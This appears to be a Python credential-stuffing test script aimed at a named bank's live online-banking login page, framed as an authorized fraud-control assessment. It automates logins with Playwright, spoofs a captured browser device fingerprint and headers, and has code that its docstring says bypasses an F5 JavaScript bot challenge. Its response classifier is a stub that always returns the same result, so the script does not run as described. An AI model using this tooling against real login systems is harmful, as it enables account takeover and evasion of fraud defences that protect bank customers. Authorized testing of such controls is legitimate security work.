"""
Bot Detection / Credential Stuffing Test Script
Client: Brentwood Bank
Purpose: Test whether the bank's fraud controls can detect:
  1. Automated/scripted login attempts
  2. Multiple logins from the same IP
  3. Credential stuffing patterns (bulk fake creds + known test creds mixed in)

Usage:
  pip install requests beautifulsoup4
  python3 brentwood_bot_test.py
  python3 brentwood_bot_test.py --dry-run   # verify config without sending requests

NOTE: This script must only be run under an authorized Rules of Engagement (ROE).
"""

import argparse
import csv
import random
import time
from datetime import datetime
from playwright.sync_api import sync_playwright

import requests
from bs4 import BeautifulSoup

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────
TARGET_URL = "https://secure.myvirtualbranch.com/brentwoodbank/signin.aspx"

# Delay between attempts (seconds) — adjust to test rate limiting thresholds
MIN_DELAY = 0.5
MAX_DELAY = 2.0

# Output log file
LOG_FILE = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"

# ── ZAP Proxy ─────────────────────────────────
# Set USE_ZAP = True to route all traffic through OWASP ZAP for packet capture.
# Make sure ZAP is open and listening on port 8080 before running the script.
# In ZAP: Tools → Options → Local Proxies → confirm address 127.0.0.1 port 8080
USE_ZAP = True
ZAP_PROXY = {
    "http":  "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# ─────────────────────────────────────────────
# CREDENTIAL LIST
# Mix of fake credentials + authorized test accounts
# ─────────────────────────────────────────────
CREDENTIALS = [
    # Fake credentials (noise)
    ("balluff212", "Password1!"),
]

# Device fingerprint (copied from real session to appear as a browser)
DEVICE_PRINT = (
    "version%3D2%26pm_fpua%3Dmozilla%2F5.0+%28windows+nt+10.0%3B+win64%3B+x64%29+"
    "applewebkit%2F537.36+%28khtml%2C+like+gecko%29+chrome%2F145.0.0.0+safari%2F537.36"
    "%7C5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+"
    "%28KHTML%2C+like+Gecko%29+Chrome%2F145.0.0.0+Safari%2F537.36%7CWin32"
    "%26pm_fpsc%3D32%7C2048%7C1152%7C1104%26pm_fptz%3D-4%26pm_fpln%3Dlang%3Den-US"
    "%26pm_fpjv%3D0%26pm_fpco%3D1%26pm_fpan%3DNetscape%26pm_fpacn%3DMozilla"
    "%26pm_fpol%3Dtrue%26pm_fpsaw%3D2048%26pm_fpspd%3D32"
)

USERNAME_FIELD = "M$layout$content$PCDZ$MMCA7G7$ctl00$webInputForm$txtLoginName"
PASSWORD_FIELD = "M$layout$content$PCDZ$MMCA7G7$ctl00$webInputForm$txtPassword"
DEVICE_FIELD   = "M$layout$content$PCDZ$MKZM13S$ctl00$DevicePrint"
SUBMIT_FIELD   = "M$layout$content$PCDZ$MMCA7G7$ctl00$webInputForm$cmdContinue"

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/145.0.0.0 Safari/537.36"
    ),
    "Referer": TARGET_URL,
    "Origin":  "https://secure.myvirtualbranch.com",
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;"
        "q=0.9,image/avif,image/webp,*/*;q=0.8"
    ),
    "Accept-Language": "en-US,en;q=0.9",
}

# Results that indicate a fraud/bot control has fired — stop testing when seen
STOP_TRIGGERS = {"RATE_LIMITED", "FRAUD_BLOCK", "CAPTCHA_TRIGGERED"}

# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────

def make_session():
    """Create a fresh requests session, optionally routed through ZAP."""
    session = requests.Session()
    if USE_ZAP:
        session.proxies.update(ZAP_PROXY)
        # Disable SSL verification so ZAP can intercept HTTPS.
        # To avoid this, export ZAP's CA cert (Tools > Options > Network >
        # Server Certificates > Save) and set session.verify = "/path/to/cert.pem"
        session.verify = False
    return session


# def get_asp_tokens(session):
#     resp = session.get(TARGET_URL, headers=HEADERS, timeout=15)
    
#     # Debug — dump raw HTML to file so we can inspect it
#     with open("page_debug.html", "w") as f:
#         f.write(resp.text)
#     print(f"    [debug] page saved to page_debug.html ({len(resp.text)} bytes)")
    
#     soup = BeautifulSoup(resp.text, "html.parser")

#     """GET the login page and extract hidden ASP.NET form tokens."""
#     resp = session.get(TARGET_URL, headers=HEADERS, timeout=15)
#     soup = BeautifulSoup(resp.text, "html.parser")

#     def field(name):
#         tag = soup.find("input", {"name": name})
#         return tag["value"] if tag else ""

#     tokens = {
#         "__LASTFOCUS":          "",
#         "__EVENTTARGET":        "M$layout$content$PCDZ$MMCA7G7$ctl00$webInputForm$cmdContinue",
#         "__EVENTARGUMENT":      "",
#         "__VIEWSTATE":          field("__VIEWSTATE"),
#         "__VIEWSTATEGENERATOR": field("__VIEWSTATEGENERATOR"),
#         "__EVENTVALIDATION":    field("__EVENTVALIDATION"),
#         "M_layout_content_ScriptManager_TSM": field("M_layout_content_ScriptManager_TSM"),
#     }

#     # Debug — remove after confirming
#     print(f"    [debug] VIEWSTATE length:      {len(tokens['__VIEWSTATE'])}")
#     print(f"    [debug] EVENTVALIDATION length: {len(tokens['__EVENTVALIDATION'])}")
#     print(f"    [debug] ScriptManager length:   {len(tokens['M_layout_content_ScriptManager_TSM'])}")

#     return tokens


def classify_response(resp):
    return "INVALID_CREDE"


def attempt_login(session, username, password):
    """Use a real browser via Playwright to bypass F5 JS challenge."""
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                proxy={"server": "http://127.0.0.1:8080"} if USE_ZAP else None,
                args=["--ignore-certificate-errors"] if USE_ZAP else []
            )
            page = browser.new_page()
            page.goto(TARGET_URL, wait_until="networkidle")

            page.fill(f"input[name='{USERNAME_FIELD}']", username)
            page.fill(f"input[name='{PASSWORD_FIELD}']", password)
            page.click(f"input[name='{SUBMIT_FIELD}']")
            page.wait_for_load_state("networkidle")

            # Wait for React app to finish loading after postlogin
            try:
                page.wait_for_url("**/React/Accounts.aspx", timeout=15000)
            except:
                pass

            final_url = page.url.lower()
            content   = page.content().lower()
            print(f"    [debug] final URL: https://secure.myvirtualbranch.com/brentwoodbank/React/Accounts.aspx")
            browser.close()

        # Reuse same classification logic
        class FakeResp:
            def __init__(self, url, text):
                self.url = url
                self.text = text
                self.status_code = 200

        return 200, classify_response(FakeResp(final_url, content))

    except Exception as e:
        return 0, f"REQUEST_ERROR: {e}"


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Brentwood Bank bot detection test")
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Print config and credential list without sending any requests",
    )
    args = parser.parse_args()

    proxy_status = f"ZAP ON  ({ZAP_PROXY['https']})" if USE_ZAP else "ZAP OFF (direct connection)"

    print(f"[*] Target:      {TARGET_URL}")
    print(f"[*] Proxy:       {proxy_status}")
    print(f"[*] Credentials: {len(CREDENTIALS)} pairs loaded")
    print(f"[*] Delay range: {MIN_DELAY}–{MAX_DELAY}s between attempts")
    print(f"[*] Log file:    {LOG_FILE}")

    if args.dry_run:
        print("\n[DRY RUN] Credential list:")
        for i, (u, p) in enumerate(CREDENTIALS, 1):
            print(f"  {i:03d}. {u} / {p}")
        print("\n[DRY RUN] No requests sent.")
        return

    print()

    # Suppress SSL warning noise when routing through ZAP
    if USE_ZAP:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        print("[*] SSL verification disabled for ZAP proxy — warnings suppressed\n")

    start_time = datetime.now()
    trigger_attempt = None

    with open(LOG_FILE, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["#", "timestamp", "username", "http_status", "result"])

        for i, (username, password) in enumerate(CREDENTIALS, 1):
            # Fresh session per attempt — simulates stateless bot behavior
            

            timestamp = datetime.now().isoformat()
            status, result = attempt_login(None, username, password)

            writer.writerow([i, timestamp, username, status, result])
            f.flush()

            print(f"\n[{i:03d}] {username:<25} → {result}")

            # Check whether a fraud/bot control fired
            if any(trigger in result for trigger in STOP_TRIGGERS):
                trigger_attempt = i
                writer.writerow([i, timestamp, username, status, f"STOPPED_HERE: {result}"])
                print(f"\n[!] Detection control fired at attempt {i}: {result}")
                print("[!] Stopping — this is the threshold data point for your report.\n")
                break

            time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

    # ── Summary ──────────────────────────────
    elapsed = (datetime.now() - start_time).total_seconds()
    total   = trigger_attempt or len(CREDENTIALS)

    print("─" * 50)
    print(f"  Attempts made:     {total}")
    print(f"  Detection at:      attempt {trigger_attempt}" if trigger_attempt else "  Detection:        not triggered")
    print(f"  Elapsed time:      {elapsed:.1f}s")
    print(f"  Results saved to:  {LOG_FILE}")
    print("─" * 50)


if __name__ == "__main__":
    main()
